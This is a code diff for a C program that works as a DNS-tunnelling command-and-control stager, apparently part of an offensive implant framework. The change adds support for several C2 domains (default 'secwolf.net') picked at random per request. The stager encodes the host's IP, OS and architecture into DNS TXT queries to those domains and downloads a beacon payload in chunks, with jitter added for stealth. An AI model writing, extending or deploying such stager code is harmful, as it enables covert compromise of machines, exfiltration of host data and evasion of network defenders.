@@ -68,13 +68,14 @@
     #define DNS_SERVER "8.8.8.8"  // Default if not set by build system
 #endif
 #define DNS_PORT 53
-#ifndef C2_DOMAIN
-    #define C2_DOMAIN "secwolf.net"  // Default if not set by build system
+#ifndef C2_DOMAINS
+    #define C2_DOMAINS "secwolf.net"  // Comma-separated domains, default if not set by build system
 #endif
 #define MAX_LABEL_LEN 63
 #define MAX_DOMAIN_LEN 253
 #define MAX_TXT_LEN 255
 #define DNS_TIMEOUT 10
+#define MAX_DOMAINS 10
 
 // Retry configuration - can be overridden at build time
 #ifndef MAX_RETRIES
@@ -708,8 +709,9 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
 /*
  * Send stager message via DNS TXT query
  * Encodes message with base36 for DNS compatibility
+ * Now accepts target_domain parameter for multi-domain load balancing
  */
-static int send_dns_message(const char *message, char *response, size_t response_size) {
+static int send_dns_message(const char *message, const char *target_domain, char *response, size_t response_size) {
     char encoded[512];
     char domain[1024];
     
@@ -720,11 +722,11 @@ static int send_dns_message(const char *message, char *response, size_t response
     
     // Retry mechanism with delays
     for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
-    DEBUG_PRINT("[*] DNS query attempt %d/%d\n", attempt + 1, MAX_RETRIES);
+    DEBUG_PRINT("[*] DNS query attempt %d/%d to %s\n", attempt + 1, MAX_RETRIES, target_domain);
         
         // Generate fresh timestamp for each attempt (cache busting + unique per retry)
         snprintf(domain, sizeof(domain), "%s.%lu.%s", 
-                 encoded, (unsigned long)time(NULL), C2_DOMAIN);
+                 encoded, (unsigned long)time(NULL), target_domain);
         
         DEBUG_PRINT("[*] Querying: %s\n", domain);
         
@@ -858,16 +860,43 @@ int main(int argc, char *argv[]) {
     char message[256];
     char response[4096];
     char session_id[128] = "";
-    char dns_domains[512] = "";
     int total_chunks = 0;
     unsigned char **chunks = NULL;
     size_t *chunk_sizes = NULL;
     
-    // Initialize random seed for jitter (using current time)
+    // Parse compiled-in domains for load balancing
+    char domains_copy[512];
+    strncpy(domains_copy, C2_DOMAINS, sizeof(domains_copy) - 1);
+    domains_copy[sizeof(domains_copy) - 1] = '\0';
+    
+    char *domain_list[MAX_DOMAINS];
+    int domain_count = 0;
+    
+    char *token = strtok(domains_copy, ",");
+    while (token != NULL && domain_count < MAX_DOMAINS) {
+        // Trim whitespace
+        while (*token == ' ') token++;
+        domain_list[domain_count++] = token;
+        token = strtok(NULL, ",");
+    }
+    
+    if (domain_count == 0) {
+        DEBUG_PRINT("[!] No domains configured\n");
+        return 1;
+    }
+    
+    // Initialize random seed for jitter AND domain selection
     srand((unsigned int)time(NULL));
     
     DEBUG_PRINT("[*] Starting stager...\n");
     DEBUG_PRINT("[*] ================================================\n");
+    DEBUG_PRINT("[*] SHADOW MESH CONFIGURATION:\n");
+    DEBUG_PRINT("[*] ------------------------------------------------\n");
+    DEBUG_PRINT("[*]   DNS Domains:   %d servers\n", domain_count);
+    for (int i = 0; i < domain_count; i++) {
+        DEBUG_PRINT("[*]     └─ %s\n", domain_list[i]);
+    }
+    DEBUG_PRINT("[*] ------------------------------------------------\n");
     DEBUG_PRINT("[*] COMPILED JITTER CONFIGURATION:\n");
     DEBUG_PRINT("[*] ------------------------------------------------\n");
     DEBUG_PRINT("[*]   Jitter Range:  %d - %d ms (%.1f - %.1f seconds)\n", 
@@ -886,48 +915,36 @@ int main(int argc, char *argv[]) {
     
     DEBUG_PRINT("[*] System info: IP=%s, OS=%s, ARCH=%s\n", local_ip, PLATFORM, arch);
     
+    // Pick random domain for initial STG request
+    char *initial_domain = domain_list[rand() % domain_count];
+    DEBUG_PRINT("[*] Selected domain for STG: %s\n", initial_domain);
+    
     // Send initial stager message: STG|IP|OS|ARCH
     snprintf(message, sizeof(message), "STG|%s|%s|%s", local_ip, PLATFORM, arch);
     DEBUG_PRINT("[*] Sending: %s\n", message);
     
-    if (send_dns_message(message, response, sizeof(response)) != 0) {
+    if (send_dns_message(message, initial_domain, response, sizeof(response)) != 0) {
     DEBUG_PRINT("[!] Failed to send DNS message\n");
         return 1;
     }
     
     DEBUG_PRINT("[*] Received response: %s\n", response);
     
-    // Parse metadata response: META|<total_chunks> or META|<total_chunks>|<dns_domains>|<session_id>
+    // Parse metadata response: META|<total_chunks>
     if (strncmp(response, "META|", 5) != 0) {
     DEBUG_PRINT("[!] Invalid response format (expected META|)\n");
         return 1;
     }
     
-    // Parse the response - format: META|total_chunks|domain1,domain2,domain3
-    char *token = response + 5; // Skip "META|"
-    char *pipe1 = strchr(token, '|');
-    
-    if (pipe1) {
-        // New format with domains: META|chunks|domains
-        *pipe1 = '\0'; // Null terminate chunks part
-        total_chunks = atoi(token);
-        
-        // Extract domains
-        char *domains_start = pipe1 + 1;
-        strncpy(dns_domains, domains_start, sizeof(dns_domains) - 1);
-        dns_domains[sizeof(dns_domains) - 1] = '\0';
-        
-        DEBUG_PRINT("[*] Shadow Mesh mode: %d chunks, domains: %s\n", total_chunks, dns_domains);
-    } else {
-        // Legacy format: META|chunks (standalone mode)
-        total_chunks = atoi(token);
-        DEBUG_PRINT("[*] Standalone mode: %d chunks\n", total_chunks);
-    }
+    // Parse the response - format: META|total_chunks
+    total_chunks = atoi(response + 5);
     
     if (total_chunks <= 0 || total_chunks > MAX_CHUNKS) {
     DEBUG_PRINT("[!] Invalid chunk count: %d\n", total_chunks);
         return 1;
     }
+    
+    DEBUG_PRINT("[*] Beacon divided into %d chunks for retrieval\n", total_chunks);
     
     // Generate session ID (timestamp + random)
     snprintf(session_id, sizeof(session_id), "stg_%lu_%d", 
@@ -944,7 +961,7 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    // Request each chunk with jitter for stealth
+    // Request each chunk with jitter for stealth and load balancing
     int burst_number = 0;
     for (int i = 0; i < total_chunks; i++) {
         // Mark the start of a new burst
@@ -955,15 +972,18 @@ int main(int argc, char *argv[]) {
                        (i + CHUNKS_PER_BURST - 1 < total_chunks) ? i + CHUNKS_PER_BURST - 1 : total_chunks - 1);
         }
         
-        DEBUG_PRINT("[*] Requesting chunk %d/%d\n", i+1, total_chunks);
+        // Pick random domain for load balancing (client-side round-robin)
+        char *target_domain = domain_list[rand() % domain_count];
         
-        // Send ACK|<chunk_index>|<IP>|<session_id>
-        // In Shadow Mesh mode, session_id is used; in standalone, it's "UNKN0WN"
-        snprintf(message, sizeof(message), "ACK|%d|%s|%s", 
+        DEBUG_PRINT("[*] Requesting chunk %d/%d from %s\n", i+1, total_chunks, target_domain);
+        
+        // NEW PROTOCOL: CHUNK|<chunk_index>|<IP>|<session_id>
+        // Changed from ACK to CHUNK for clarity
+        snprintf(message, sizeof(message), "CHUNK|%d|%s|%s", 
                  i, local_ip, session_id[0] ? session_id : "UNKN0WN");
         
-        if (send_dns_message(message, response, sizeof(response)) != 0) {
-    DEBUG_PRINT("[!] Failed to get chunk %d\n", i);
+        if (send_dns_message(message, target_domain, response, sizeof(response)) != 0) {
+    DEBUG_PRINT("[!] Failed to get chunk %d from %s\n", i, target_domain);
             goto cleanup;
         }
         
